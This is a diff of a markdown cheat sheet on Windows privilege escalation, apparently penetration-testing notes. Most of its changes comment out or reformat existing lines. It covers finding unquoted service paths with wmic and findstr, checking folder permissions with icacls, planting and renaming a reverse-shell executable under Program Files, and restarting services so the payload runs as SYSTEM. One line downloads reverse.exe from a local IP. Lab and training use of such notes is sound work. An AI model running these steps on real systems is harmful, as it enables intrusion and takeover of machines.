@@ -81,28 +81,30 @@ format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "
 ### Reveal vulnerable services on Windows System
 https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287
 1. Unquoted Service Paths
-``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```
+#``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```
 
 Look for listed unquoted executable paths 
-Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
+
+e.g. Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
+
 If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service
 
 Check for permissions of folders
-```icacls “C:\Program Files (x86)\Program Folder”```
-F = Full Control
-Can now place a payload into the folder and start of the service it will run as SYSTEM
+#```icacls “C:\Program Files (x86)\Program Folder”```    
+
+#If (F = Full Control)  -> We can now place a payload into the folder and start of the service it will run as SYSTEM
 
 Place payloads across windows folders
-```copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’```
-```Rename-Item reverse.exe Advanced.exe```
+#```copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’```
+#```Rename-Item reverse.exe Advanced.exe```
 
 To restart and stop services USE
-```sc stop ServiceName```
-```sc start ServiceName```
+#```sc stop ServiceName```
+#```sc start ServiceName```
 
 2. Insecure File/Folder Permissions
    Check permissions for vulnerable service executable path
-```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
+#```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
 Replace executable.exe with a reverse shell payload and restarting the service
 
 
